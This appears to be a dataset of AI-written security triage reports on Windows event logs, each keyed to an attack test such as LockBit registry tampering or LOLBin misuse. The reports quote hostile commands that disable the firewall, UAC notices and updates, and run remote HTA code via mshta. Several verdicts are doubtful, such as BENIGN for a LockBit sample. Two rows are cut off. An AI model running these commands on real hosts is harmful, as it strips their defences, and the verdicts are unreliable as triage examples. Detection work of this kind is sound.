Lolbin Jsc.exe compile javascript to exe,"After analyzing the provided Windows event logs, here’s a detailed assessment regarding any suspicious or anomalous behavior:

### Analysis of Logs:

1. **System Time Changes:**
   - Multiple event logs indicate that the system time was changed slightly (EventID 1 in the System log by svchost.exe). This could indicate potential malicious activity attempting to alter timestamps, but this action alone, especially if logged by `svchost.exe`, might also be typical behavior for time synchronization.

2. **Process Executions:**
   - **PowerShell Execution (Sysmon EventID 5):** There is an execution of `powershell.exe` by a user `admin_test`, but there is no evidence in the logs of any unusual PowerShell script or command being executed. PowerShell execution itself is not inherently malicious unless accompanied by indicative command lines or scripts, usually indicative of malicious intent.
   - **Process Chain involving `cmd.exe`, `jsc.exe`, and `cvtres.exe`:** The command line used in Sysmon EventID 1 is noteworthy because it involves the execution of a JavaScript file using .NET's `jsc.exe`, followed by actions with `cvtres.exe`. While these processes are legitimate, the sequence is typically less common in average user activity and warrants closer inspection, especially given the involvement of temporary directories.

3. **User Activity:**
   - All suspicious process chain actions (i.e., involving `cmd.exe`, `jsc.exe`, and `cvtres.exe`) were executed under `SERVER002\admin_test`, who has high integrity level. This indicates activities were performed with elevated permissions, which is worth examining further, especially if `admin_test` is a normal user without such privileges.

### Assessment:
- **BENIGN:** System time changes and use of svchost.exe are not uncommon activities and typically relate to legitimate system functioning.
- **SUSPICIOUS:** 
  - The `powershell.exe` execution without accompanying details is not typical, yet without command-line specifics or other context, it’s hard to classify as outright malicious.
  - The `cmd.exe` action with conversion of a JavaScript file via `jsc.exe`, culminating in `cvtres.exe` operations, while not automatically implying malice, suggests actions potentially deviating from routine behavior. If these actions are not tied to a known, legitimate user-initiated process or necessary system update, they warrant further investigation.
  
Based on the logs provided, my final resolution is **SUSPICIOUS**. The sequence of process executions and script interactions doesn't directly implicate malicious intent but indicates unusual activities needing further investigation. Recommendations include:

- **Verify User Actions:** Confirm if `admin_test` executed these activities intentionally or if any unusual login sessions match these actions.
- **Review Scripts and Executables:** Check the `hello.js` script and resulting output, determining purposes and if these processes were known.
- **Monitor for Recurring Activity:** Any repetition of this pattern could suggest automated scripts or scheduled tasks indicative of deeper system compromise.
- **Conduct Full AV/Malware Scan:** To ensure no compromised files correlate with the executions witnessed in the logs. 

The suspicious nature of observed actions must be contextualized with additional log data, user-confirmed actions, or threat intelligence sources."
Disable Windows CMD application,"Upon careful analysis of the provided Windows event logs, several observations can be made regarding potential indicators of suspicious or malicious activity:

1. **whoami.exe and conhost.exe Execution:** 
   - The execution of `C:\Windows\System32\whoami.exe` by the user `SERVER002\admin_test` is noted multiple times. This command-line utility is benign by itself as it displays user information. However, its repeated execution could indicate reconnaissance activity, especially if it is not typical for this user or system.
   - `C:\Windows\System32\conhost.exe` is observed after the `whoami.exe` execution. This is a standard console window host process, typically not harmful when used in conjunction with known processes.

2. **Powershell Activity:**
   - A suspicious PowerShell command is executed: `powershell.exe New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1`. This command modifies the registry to disable the command prompt, which may be an attempt to hinder local command-line operations. This action is usually conducted to prevent a user from accessing CMD, potentially indicative of malicious intent to secure persistence or prevent local troubleshooting.

3. **Privilege Escalation and System Processes:**
   - The security log indicates a typical system logon by the `SYSTEM` account with elevated privileges, which is normal behavior for Windows services.
   - The Sysmon logs showcase scheduled and legitimate updates and installations by processes like `MicrosoftEdgeUpdate.exe`, and these are executed by the `NT AUTHORITY\SYSTEM` user with system integrity, representing benign activity related to software updates.

4. **Time Manipulation:**
   - A minor anomaly is noted in the system log where the system time was adjusted. Time changes can be relevant in certain attack scenarios, but in this context, it appears to be corrected by legitimate time synchronization services (`time.windows.com`).

5. **Edge Update Processes:**
   - Multiple entries for Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, etc.) are observed. This repetitive activity seems consistent with legitimate update operations for the Microsoft Edge browser.

**Assessment:**
- The PowerShell activity that modifies the system registry to disable CMD is considered suspicious, as it can be leveraged for restricting local administrative capabilities and could be indicative of malicious configurations.
- The presence of repetitive `whoami.exe` executions, while not malicious on its own, combined with the PowerShell activity raises suspicion.
- Other activities, like Microsoft Edge updates and system-level service executions, appear to be benign and consistent with routine system operations.

**Resolution: SUSPICIOUS**

Given the indications of a suspicious PowerShell command execution that modifies registry settings and the repeated execution of `whoami.exe`, further investigation is recommended to understand:
- The context in which these activities occurred and whether they align with expected user behavior.
- Investigate any other changes in the system related to network connections or file modifications that could correlate with potential malicious goals.
- Determine if there are any unauthorized access patterns or privilege escalations beyond what is recorded in these logs.

Guidance on how to proceed includes reviewing relevant system configurations, cross-verifying other security logs for anomalies, examining access controls, and monitoring for unusual activity going forward."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"### Analysis of the Logs

#### Security Log
- **Event ID 4616:** These events indicate a change in system time executed by the `svchost.exe` process under the `LOCAL SERVICE` account. Normally benign, but a shift in system time could be used to cover tracks in a compromise. However, such a pattern is not inherently malicious without further context. The time adjustments seem minor, consistent with possible system time synchronization, which is normal.

#### Application Log
- **EdgeUpdate:** Logs show the stopping of services related to Microsoft Edge Update, which is a system update utility, indicating typical update processes. No evidence of misuse or anomalous patterns was present.

#### Sysmon Log
- **Process Creation and Termination:**
  - **Wevtutil.exe and Conhost.exe Usage:** Multiple executions of `wevtutil.exe` and `conhost.exe` by `admin_test` are seen. `wevtutil.exe` is a legitimate tool used for managing Windows event logs, while `conhost.exe` is the console host process. Normally benign, but frequent invocation may warrant further audit to clarify legitimacy, especially for script or automated tasks.
  - **Cmd.exe and Reg.exe Usage:** There's a `cmd.exe` execution altering the Windows Registry, adding a registry key to disable the privacy experience. This command suggests an administrative task, likely an update or system configuration change. Although this could be legitimate in an enterprise environment, unauthorized registry changes merit closer inspection.
  - **Microsoft Edge Update Activity:** Extensive activity related to Microsoft Edge Update is visible, reflecting typical update/service registration tasks. These are consistent with benign update processes.

#### System Log
- Displays time synchronization activity with an external time server (`time.windows.com`). This is suggestive of routine system behavior where time synchronization protocol (NTP) is in use.

#### Windows PowerShell Log
- The absence of any entries does not raise any immediate concerns but would require verification if additional context around PowerShell activities was relevant.

### Assessment and Resolution

- **BENIGN:** The patterns observed across logs suggest routine system operations, including time synchronization, system updates, and administrative tasks handled by a user account (`admin_test`). The time adjustments and registry changes appear deliberate rather than indicative of an inherent threat. Without further suspicious or unauthorized context, these activities align with typical system maintenance and update processes. However, due diligence should include ensuring all administrative tasks are authorized.

### Recommended Actions
- Verify `admin_test` activities are approved and access is secure.
- Continuously monitor for anomalies, particularly regarding system clock manipulations or unauthorized registry changes.
- Conduct periodic audits and user access reviews to ensure consistency with organizational security policies.
- Ensure all system update mechanisms, especially those related to Microsoft Edge, are trusted and correctly configured.

No immediate threats or actionables were identified in this log snapshot."
LockBit Black - Unusual Windows firewall registry modification -cmd,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior:

1. **Use of Command-Line Utilities:**
   - The command `cmd.exe` is used to disable the firewall by modifying Windows Registry keys for both Domain and Standard Profiles:
     - Command: `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f & reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f`
   - This action suggests an attempt to weaken the system's security posture by disabling the firewall, which is a red flag for potentially malicious activity.

2. **Execution of Native Windows Utilities:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed. While their execution can be legitimate, they are sometimes used for malicious purposes, such as clearing event logs or tampering with processes.

3. **Privilege Escalation (Security Log Event 4672):**
   - The `admin_test` user has been granted a set of sensitive privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are often leveraged during an attack for privilege escalation and system tampering.

4. **Network and Logon Activity:**
   - Logon events using NTLM authentication are observed, which may indicate lateral movement or unauthorized access attempts from a remote host (`DESKTOP-3HL5B2P` and IP `fe80::e3b5:5371:12a8:9c77`).

5. **Execution of Hostname and Whoami:**
   - `hostname.exe` and `whoami.exe` were executed, suggesting a possible attempt to gather system information.

6. **Repetitive Execution of Edge Update Processes:**
   - Multiple instances of Microsoft Edge update-related executables are seen. While this could be part of a legitimate update process, excessive or unexpected installation activity could be a cause for concern in case of software supply chain attacks or unauthorized software changes.

#### Malicious Activities or Indicators of Compromise:

- The primary indicator of malicious activity is the execution of commands to disable the firewall, which could potentially expose the system to external threats.
- The combination of privilege escalation and disabling firewall settings demonstrates malicious intent, likely indicating a compromise.
- The suspicious logon activity using NTLM could suggest unauthorized remote access or an attempt to move laterally within the network.

### Assessment and Resolution:

Given the identified behaviors, particularly the registry modifications to disable the firewall, it provides a strong indication of malicious activity.

- **Assessment:** The coordinated use of privileged operations and the weakening of security measures paired with anomalous network logons and potential reconnaissance commands indicate an active compromise.

### Resolution: MALICIOUS

### Guidance on How to Proceed:

InstallUtil evasive invocation,"Upon review of the provided event logs, several indicators suggest potentially malicious activity occurring on the system. Here's a detailed analysis of the most notable events:

### Suspicious Behavior:

1. **PowerShell Execution**:
   - A PowerShell script was executed with a complex command line involving `InstallUtil.exe` and a file named `readme.txt`. This behavior is often indicative of an attempt to execute a file with elevated privileges. Additionally, creating a copy of `InstallUtil.exe` as `notepad.exe` in `System32\Tasks` is highly suspicious as it could be an attempt to evade detection mechanisms. 
   - The use of `PowerShell` to orchestrate these actions, as captured in multiple log entries, points towards the potential for unauthorized command execution or scripting attacks.

2. **Unusual Use of System Tools**:
   - Execution of `csc.exe` (C# compiler) and `cvtres.exe` indicates potential compilation activities on the system, which is unusual unless software development activities justify it.
   - Execution of `wevtutil.exe`, which is used to query and manage event logs, multiple times in quick succession, raises concerns about log tampering or gathering for an unauthorized purpose.
  
3. **Weird Copy Commands**:
   - Copying `InstallUtil.exe` to a location disguised as `notepad.exe` may be an attempt to bypass application whitelisting or draw less attention during process execution monitoring.

4. **Elevated Privileges and Account Enumeration**:
   - Multiple logs show service and administrative operations being performed by the `SYSTEM` and with elevated privileges which may indicate privilege escalation or an attempt to maintain persistence.

### Assessing Malicious Intent:

Considering the combination of PowerShell scripting activities, attempts to utilize `InstallUtil.exe`, compiling activities using `csc.exe`, and atypical system tool usage, there are strong indications of malicious activity. These patterns are commonly associated with sophisticated threat actors attempting to exploit systems via living-off-the-land binaries (LOLBins) and circumvent common security defenses.

### Conclusion and Recommendations:

- **Resolution**: **MALICIOUS**
  
- **Actionable Recommendations**:
  - **Immediate containment** measures should be initiated. Disconnect the affected host from the network to prevent further spread or data exfiltration.
  - **Thorough forensic analysis** should be performed on the system to identify any additional indicators of compromise or footprint left by the attacker.

Snake Malware Encrypted crmlog file,"**Analysis:**

Upon review of the provided logs from the Windows host, several events stand out because of unusual behavior, indicating potential security risks. The analysis is based on the Sysmon, PowerShell, System, and Security logs.

1. **Sysmon Logs:**
   - **PowerShell Execution (Event ID 1):** The presence of a PowerShell command that creates a file in the `C:\Windows\registration` directory with attributes set to 'Hidden', 'System', and 'Archive' is suspicious. Such behavior is commonly associated with malware trying to hide its files. The use of PowerShell with a script that executes file creation with those attributes is notorious for being used by attackers.
   - **Frequent Usage of `whoami.exe`, `conhost.exe`, and `wevtutil.exe` (Event ID 1 and 5):** These may be benign, but frequent execution in a short span, especially conhost.exe in various contexts, could indicate process injection or persistence attempts.
   - **Unexpected PowerShell Activities:** Multiple PowerShell operations, especially under an admin context without clear legitimate operational purpose, can be indicative of malicious activity.

2. **PowerShell Logs:**
   - The PowerShell log events confirm that a command was run that sets file attributes to Hidden and System, typically to conceal malware operations.

3. **System Logs:**
   - The logs predominantly show Windows Update activities which look legitimate and essential for keeping the system up to date and secured.

4. **Security Logs:**
   - The security logs show events related to credential queries for a Microsoft account and failed read operations with return codes that indicate an access issue. These may not necessarily indicate an attack but could be associated with an attempt to access resources without proper authentication.

**Assessment:**

Based on the evidence, there is a notable **suspicious** activity primarily due to the PowerShell command execution aimed at creating hidden system files and frequent execution of system binaries which can indicate an adversary performing reconnaissance or setting persistence. These activities should not commonly happen without clear legitimate reasons or specific task scheduling by an IT administrator. Given the powerful capabilities of PowerShell and the potential for scripted attacks, caution is advised.

**Resolution: SUSPICIOUS**

**Guidance:**

1. **Immediate Actions:**
   - Isolate the system from the network to prevent any further potential malicious activity.
   - Conduct a thorough malware scan using updated antivirus solutions.

2. **Forensic Actions:**
   - Analyze the PowerShell script thoroughly to understand its intent and origin.
   - Investigate the user ""SERVER002\admin_test"" to determine if the actions were intentional or compromised credentials.
   - Check for any network connections or data exfiltration attempts that could be related to this activity.

3. **Preventive Measures:**
   - Implement strict PowerShell execution policies, allowing scripts only from trusted sources.
   - Regularly update system and security patches to mitigate vulnerabilities.
   - Educate users about safe usage practices, especially those with administrative access.

Ensure detailed documentation and reporting to the IT security department to support any potential escalation or further investigation efforts."
Set a firewall rule using New-NetFirewallRule,"After analyzing the provided event logs from the Windows host, several observations have been made:

### Suspicious and Anomalous Behavior Identified:
1. **Time Change Event:**
   - The logs indicate an anomalous change in the system time, as noted in both the System and Security logs. Specifically, events where the `OldTime` is later than the `NewTime` suggest that the system time was rolled back. This can be indicative of an attempt to cover activities or to disrupt normal logging processes. These changes involved the process `svchost.exe` which is a legitimate and default Windows service host but often targeted for malicious activity due to its ubiquitous presence and generic name.
   
2. **PowerShell Command Execution:**
   - There is a PowerShell command `New-NetFirewallRule` detected that creates a new firewall rule allowing inbound connections on port 21 (commonly used for FTP). While creating firewall rules can be benign under administrative tasks, this command was executed with high integrity levels under the user `admin_test`, and without further context, this could be an attempt to establish unauthorized access.
   - Frequent creation and usage of PowerShell scripts, especially involving firewall rules or opening ports, should be scrutinized further for intent and authorization.
   
3. **Wevtutil Utility:**
   - There is a noticeable use of `wevtutil.exe`, which is a command line utility to manage Windows event logs and can be used to clear or export logs. If not performed by legitimate administrative processes, the frequent calls could be indicative of log tampering attempts to cover malicious activities.
   
4. **Multiple Microsoft Edge Updates and Executions:**
   - The logs show frequent executions and updates of Microsoft Edge components, which is normal behavior for a system with web-based applications. However, given the overlap with suspicious activities, it's important to verify that these are legitimate updates and not leveraged for attack vectors.

### Assessment:
The combination of persistent PowerShell usage, particularly for creating firewall rules, system time modification, and the use of wevtutil, strongly aligns with tactics used in malicious activities such as obfuscation (to hide tracks), privilege escalation (opening ports), and maintaining persistence.

### Conclusion:
Based on the analysis of the event logs, the investigation reveals the presence of activities that align more closely with **suspicious** rather than purely malicious behavior. Some events, especially the time modification and PowerShell invocations, warrant further verification to rule out false positives and ascertain the legitimacy of the actions.

### Recommended Actions:
1. **Investigate Further:**
   - Verify if the PowerShell execution was done under authorized conditions and not manipulated through phishing or after an unauthorized breach.
   - Collaborate with system administrators to confirm the necessity and legitimacy of the wevtutil and Edge updates usage.
   
2. **Monitor Network Traffic:**
   - Look for unusual inbound connections on port 21 and ensure that they are legitimate and traceable to authenticated sources.

3. **Review Security Settings:**
   - Inspect current network and firewall settings to ensure they align with the organization's security policies.
   - Conduct thorough review of accounts with high integrity level access, like `admin_test`, for any indications of privileged account compromise.

Given these observations and recommendations, the final resolution for the case is **SUSPICIOUS**. Further investigation is needed to eliminate doubts about potentially unauthorized activities."
Disable Windows OS Auto Update,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Application Log
- The events suggest routine operations related to the Microsoft Edge Update and the Software Protection Platform Service. The Service stopped messages for `edgeupdate` are common during updates or maintenance tasks.

### System Log
- The logs show some adjustments in the system time, performed by `svchost.exe`, under the authority of `LOCAL SERVICE`. Time changes could be a result of time synchronization tasks, and the presence of the `Microsoft-Windows-Time-Service` event indicates it might be linked to network time synchronization.

### Sysmon Log
- The Sysmon logs predominantly depict the execution of various Windows processes, including `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`. The `cmd.exe` process runs a command to modify the Windows Update settings in the registry:
  - `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f`
  - This command is used to disable automatic Windows updates. While this is a legitimate command, if not executed as part of a validated IT process, this modification could indicate an attempt to avoid system updates for potentially malicious purposes.

- The frequent execution of Microsoft Edge Update-related processes indicates an update task, which is standard for maintaining current versions of installed software.

### Security Log
- The security log events indicate time change activities performed under `LOCAL SERVICE`, aligning with time synchronization functions, and show no direct indicators of privilege escalation or unauthorized access attempts.

### Assessment
- **Suspicious Activity:**
  - The registry modification via `cmd.exe` to disable automatic updates (`NoAutoUpdate`) is concerning if there is no legitimate reason provided. This action can be used by attackers to maintain persistence by preventing security patches.

- **No Malicious Indicators:**
  - The other activities, including Edge update processes, routine system operations, and time synchronization, appear typical for regular system operations, considering no additional context of anomalies in related systems.

### Conclusion
Given the evidence outlined, the logs reveal one suspicious activity related to the disabling of automatic updates via registry modification without context indicating a permitted procedure, suggesting further investigation is warranted to confirm legitimacy.

**Resolution:** **SUSPICIOUS**

### Guidance
- Investigate the context around the `cmd.exe` registry modification. Verify if this action was performed by an authorized user or scheduled IT task.
- Review the patch management policies and ensure they align with the company’s security standards.
- Monitor for additional indicators of compromise or further unauthorized changes to system settings."
Windows Add Registry Value to Load Service in Safe Mode with Network,"Upon analysis of the provided Windows event logs, the following observations and assessments have been made:

1. **Multiple Executions of System Utilities**:
   - The logs show a significant number of executions involving system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`. The repeated invocation of utilities, especially `wevtutil.exe` (which is often used to query or modify event logs) in quick succession, can be a sign of log tampering or reconnaissance activity.

2. **High-Integrity Level Executions**:
   - Many processes, such as `HOSTNAME.EXE` and `whoami.exe`, are executed under a high integrity level, which suggests that administrative privileges or high-level permissions were used in these operations. This can be normal for administrative tasks but may also be indicative of privilege escalation attempts.

3. **Registry Modification**:
   - A command-line execution involving `cmd.exe` with the command to add a registry key `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\fileSafeMode` is present. This type of registry modification can potentially alter system boot behavior and is generally considered suspicious unless performed by trusted software or system administrators for legitimate purposes.

4. **Unusual Time Changes**:
   - The security and system logs indicate time changes (`EventID: 4616` and `EventID: 1`) performed by the `svchost.exe` process. Frequent changes in system time can be indicative of attempts to disrupt or hide activities by modifying timestamps in log entries.

5. **Common and Expected Operations**:
   - The logs also contain multiple entries related to `Microsoft Edge Update`, which appear benign and consistent with software update tasks (`MicrosoftEdgeUpdate.exe` and its various subcomponents).

6. **Evaluation Summary**:
   - The event logs exhibit a combination of both expected system and application behavior alongside potentially concerning indicators of suspicious activity, such as frequent executions of system utilities and registry modifications.

**Resolution**:
- **SUSPICIOUS**: The activity observed in the logs, particularly the repetitive use of `wevtutil.exe`, registry modifications, and system time changes, suggests potential suspicious behavior. This warrants further investigation to ascertain the legitimacy and purpose of these actions. Steps to investigate could include reviewing related user activities, process chain analysis, network logs for context, and verifying if administrative operations justify such actions."
Create Windows Hidden File with powershell,"**Detailed Analysis:**

Upon reviewing the provided event logs, a few potentially interesting events have been identified, but they require context and further investigation to provide clarity. Here are the key observations:

1. **Command Execution via CMD**:
   - Multiple entries show the execution of `cmd.exe` with commands checking the existence of `temp\\data.txt` and appending data to it. The usage of the command-line arguments such as: 
     ```shell
     ""cmd.exe"" /c IF EXIST %temp%\data.txt ( EXIT 0 ) ELSE ( EXIT 1 )
     ""cmd.exe"" /c echo system_Attrib_data >> %temp%\data.txt
     ```
   - This is a relatively benign operation if performed legitimately, likely part of a script or batch operation.

2. **PowerShell Activity**:
   - There is a PowerShell script being executed that modifies a file attribute to 'Hidden' for `temp\\data.txt`:
     ```powershell
     powershell.exe & {$file = Get-Item $env:temp\data.txt -Force, $file.attributes='Hidden'}
     ```
   - This action does not directly indicate malicious behavior but may point to suspicious attempts to hide files. PowerShell being used to modify file properties is somewhat common in administrative tasks; however, in a security context, it could also indicate attempts to hide malicious files.

3. **Utilities Execution**:
   - Execution of standard Windows utilities such as `whoami.exe`, `hostname.exe`, and several instances of `wevtutil.exe`. The presence of these calls can be benign, as these are standard command-line utilities to check user information, hostname info, and event log management.

4. **Edge Update Execution**:
   - The execution of `MicrosoftEdgeUpdate.exe` as a scheduled or service process (`/svc`).
   - This entry appears to be expected behavior for maintaining the Edge browser updates.

5. **Background Service Execution**:
   - `sppsvc.exe` (Software Protection Platform Service) and other system-level services are running under proper authority (`NT AUTHORITY\SYSTEM`), suggesting these are likely legitimate operations of system services.

**Assessment:**

- The process activities of `cmd.exe` and `PowerShell.exe` do not exhibit characteristics of a typical malware pattern (e.g., downloading payloads, executing shell scripts with obfuscation, or making external connections). However, the behavior of modifying file attributes to 'Hidden' by the PowerShell script, while it can be innocuous, should not be dismissed out of hand without the context of what initiated it.
- The standard utilities (`whoami.exe`, `hostname.exe`, `wevtutil.exe`) are often used in various administrative and troubleshooting tasks but can also form part of reconnaissance steps in an adversarial context.
- Given the lack of outright malicious indicators, coupled with the possibility of these actions being part of legitimate administrative operations, it raises a flag for further questioning rather than definitive evidence of compromise.

**Resolution:** **SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Contextual Inquiry**: Engage with the system administrators or users of the host to determine if there were any scheduled or manual tasks that coincide with these log entries. Verify the purpose behind modifying file attributes using PowerShell.

2. **Review System Configuration and Intents**: Identify if there are any scripts or configurations that match the actions seen within the logs; this helps correlate with known activities.

3. **Check for Persistence Mechanisms**: Investigate further for signs of persistence or remote control mechanisms that could be leveraged in conjunction with file hiding or sysadmin tasks.

4. **Further Event Logs Examination**: Broaden the event log scope to see if there are related network events, authentication anomalies, or unexpected changes that could hint at a coordinated sequence of suspicious activity.

Each step will help to confirm or deny potential threats, and further detail the benign or potentially harmful intent behind these events."
Invoke HTML Application - Direct download from URI,"Based on the provided logs, let's analyze the potential indicators of malicious activity:

1. **PowerShell Execution:** 
   - The PowerShell log entries (Event ID 600) show a command being executed using `powershell.exe` with `Invoke-ATHHTMLApplication`. The command references an `HTA` file hosted on a GitHub URL.
   - The command attempts to execute this using `mshta.exe`, which is often used to execute HTML applications and is known for potential abuse in executing malicious scripts or payloads.

2. **Command Line Activity:**
   - The use of a hosted HTA script from an external URL is a significant red flag, especially when executed via PowerShell. This behavior aligns with techniques often associated with malware delivery or initial access tactics.
   
3. **Sysmon Log Observations:**
   - Multiple instances of processes like `powershell.exe`, `conhost.exe`, and `wevtutil.exe` are running with the user `SERVER002\admin_test`.
   - The process tree shows `powershell.exe` being used to execute potentially malicious commands, with `conhost.exe` following as a child process, which is a typical behavior for interactive console processes but can also indicate remote or scripted invocation in this context.
   - The execution of `wevtutil.exe` is associated with event log manipulation, which can be used to cover tracks or clear logs, another sign of malicious activity.
   
4. **Indicators of Potential Compromise:**
   - The PowerShell command execution involving `mshta.exe` from an external URL is highly suspicious. This method is often leveraged by attackers to bypass various security mechanisms and gain execution control on the host system.

**Final Resolution: MALICIOUS**

**Assessment and Guidance:**
- The logs clearly indicate potentially malicious activity with the execution of PowerShell commands designed to pull and execute scripts from a GitHub repository.
- `mshta.exe` usage with externally hosted HTA files is particularly notorious in malicious campaigns.
- Immediate steps should include isolating the affected system, further analyzing the downloaded scripts/content, and identifying and mitigating any additional anomalies or incidents stemming from this activity.
- It is recommended to conduct a full forensic investigation of `Server002`, ensure that the system is disconnected from the network, and begin remediation efforts to address any potential compromises.
- Reviewing user `admin_test`'s recent activity and login history is vital, along with tightening PowerShell and script execution policies across the network."
Provlaunch.exe Executes Arbitrary Command via Registry Key,"**Analysis of the Provided Windows Event Logs:**

1. **Application Log:**
   - The only logs recorded are the ""Service stopped"" events for the ""edgeupdate"" service. These alone do not indicate any malicious activity but may signify the stopping of a legitimate update process.

2. **Sysmon Log:**
   - **Process Execution Observations**:
     - **use of `wevtutil.exe`:** This utility, used for managing event logs, can be a part of legitimate operations but can also be misused by attackers for clearing logs. Here, it is executed multiple times which might suggest an anomaly if there is no legitimate basis for frequent log management activities.
     - **`cmd.exe` Execution with Suspicious Command-Line Arguments:** The command line shows an attempt to add registry entries and start a process (Calculator) using what's known as a Living Off the Land Binaries (LOLBin) technique through `provlaunch.exe`. The presence of `LOLBin` strongly suggests unauthorized actions as it is a technique used to bypass security.
     - **Frequent `reg.exe` Usage:** This tool is used to modify registry settings and is seen here modifying keys that relate to provisioning commands. Alongside `cmd.exe`, this suggests activity attempting to leverage or exploit system capabilities.
     - **Execution of `calc.exe`:** This is triggered as a payload, likely as a test to evaluate the success of a more complex command or evade security controls through LOLBins.
   
3. **Security Log:**
   - Security ID ""LOCAL SERVICE"" adjusted system time which could be innocuous but also could imply an effort to obscure attack timelines if it is not aligned with expected time synchronization activities.

4. **Unusual Patterns:**
   - The combination of registry editing through `cmd.exe`, executing a benign system app like `calc.exe` using LOLBin techniques, and the frequent use of `wevtutil.exe` could indicate attempts at privilege escalation or lateral movement.

5. **EdgeUpdate Logs:**
   - The execution and update processes associated with Microsoft Edge Update are consistent with routine system update activities. These logs do not appear overtly suspicious by themselves as they align with expected behavior from a system maintained by Microsoft services.

**Assessment of the Situation:**
The activity involving the registry changes, execution of processes using LOLBins, and rapid consecutive executions of `wevtutil.exe` definitely stand out as SUSPICIOUS. These activities are aligned with tactics used by attackers to persist, escalate privileges, or evade detection within Windows environments.

**Threats/Risks Identified:**
- **Possible Use of LOLBins for Stealthy Execution:** There's an indication that an attacker might be utilizing built-in Windows utilities to perform malicious activities, bypassing some traditional endpoint defenses.
- **Potential Evasion or Cleanup Attempts:** The repeated usage of `wevtutil.exe` may suggest efforts to clear logs and hide activities.

**Further Steps and Guidance:**
1. **Immediate Review of Access Logs:** Investigate user `admin_test` to confirm authorized activities and any discrepancies in their session logs.
2. **Detailed Event Correlation:** Validate if these activities align with any legitimate administrative operations.
3. **Endpoint Detection and Response (EDR) System Checks:** Utilize EDR tools to trace back command-line executions and possible lateral movements.
4. **Enhanced Monitoring:** Increase logging and monitoring, specifically around registry modifications and privileged utility executions.
5. **User Awareness and Training:** Reinforce training on detecting suspicious command-line tools and behavior.
6. **Incident Response Engagement:** Engage the incident response team to further investigate and mitigate potential compromises.

**Conclusion:**
The logs indicate a SUSPICIOUS activity and warrant further investigation to comprehend the intent and extent of any unauthorized actions. Prompt action and analysis are essential to prevent potential security breaches or breaches already in progress."
Lolbin Gpscript startup option,"Upon reviewing the provided Windows event logs, I have identified and analyzed potential indicators of anomalous or malicious activities. Here is the breakdown:

1. **Windows PowerShell Log**: The PowerShell log section is empty, which means there are no PowerShell activities recorded. This absence of entries doesn't provide any indicators of malicious activity, especially when suspecting PowerShell usage in typical attack vectors.

2. **Security Log**:
   - Event ID 4616 indicates changes to the system time on the host. This could be a benign action, for example, related to regular time synchronization operations via services like `svchost.exe` interacting with the time service. There are no obvious signs of privilege escalation or unauthorized time changes based on these entries. However, time changes can sometimes be used in attacks to alter logs or evade detection, so this should be monitored if combined with other suspicious activities.

3. **Application Log**:
   - Events related to ""edgeupdate"" showing ""Service stopped"" could indicate scheduled service updates. The pattern aligns with standard software update processes. Unless there's additional context suggesting tampering, these entries seem benign.

4. **System Log**:
   - The logs show normal system activities, such as time service entries, which align with expected operations. The presence of `svchost.exe` being involved in time adjustments can be attributed to regular network time protocol (NTP) syncs.

5. **Sysmon Log**:
   - The logs show numerous executions of legitimate Windows processes, e.g., `whoami.exe`, `conhost.exe`, `cmd.exe`, related to Microsoft services and system utilities without unusual command-line arguments or integrity issues. In particular, `MicrosoftEdgeUpdate.exe` activities appear consistent with typical update operations conducted by official services.
   - The `cmd.exe` and `whoami.exe` commands are run with high integrity levels, implying they may have been executed by an administrator or scheduled system process. The command `cmd.exe /c Gpscript /startup` is typical for Group Policy script updates.
   - Several instances of Edge Update processes (`MicrosoftEdgeUpdate.exe`) are noted, all of which are consistent with expected behavior during browser or application updates, involving trusted directories and NT Authority accounts.

Based on this analysis, none of these log entries explicitly demonstrate or indicate any unequivocal malicious actions. The activities logged, such as time changes, update services, and system utilities usage, appear consistent with normal operational behaviors of a Windows system managing updates and maintaining services.

### Assessment:
- **Resolution: BENIGN**

Guidance moving forward would include regular monitoring for changes to these services and processes to ensure they remain expected and to audit for any signs of credential misuse or persisted anomalous timings that could otherwise indicate malicious intent if combined with other indicators. It's also beneficial to carry continuous updates and patches to reduce the potential for future compromise vectors."
Disable UAC notification via registry keys,"Based on a thorough examination of the provided log entries, I have identified the following key activities and their corresponding analysis:

1. **Time Change Events (Security and System Logs)**:
    - Multiple time change events were logged. These events occur due to the normal functioning of the system when synchronization with a time server (e.g., time.windows.com) occurs. The process responsible for these actions is `svchost.exe`, executing as `LOCAL SERVICE`. This behavior is routine and not indicative of malicious activity.

2. **Service and Process Execution (Sysmon Log)**:
    - **Microsoft Edge Update Activities**: Various executions of `MicrosoftEdgeUpdate.exe` and related components are observed. These processes run under the `NT AUTHORITY\SYSTEM` account, indicating routine system updates for Microsoft Edge. The command-line arguments are consistent with normal update procedures (e.g., `/svc`, `/update`, `/ua`).
    - **Administrative Command Execution**: The execution of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `reg.exe` by the `SERVER002\admin_test` user signifies administrative activities typical for systems management. Notably, the command `reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f` suggests a modification to system settings related to User Account Control (UAC) notifications. Such changes should be verified with the administrative intent as they could potentially reduce user notifications of system changes, making it a suspicious activity if unauthorized.

3. **Analysis of Suspicious Activity**:
    - **Registry Modification**: The alteration to the registry setting `UACDisableNotify` is concerning as it could be used to suppress notifications of administrative actions. This might be acceptable in certain administrative contexts but could signify an attempt to alter security settings to conceal further actions if unauthorized.
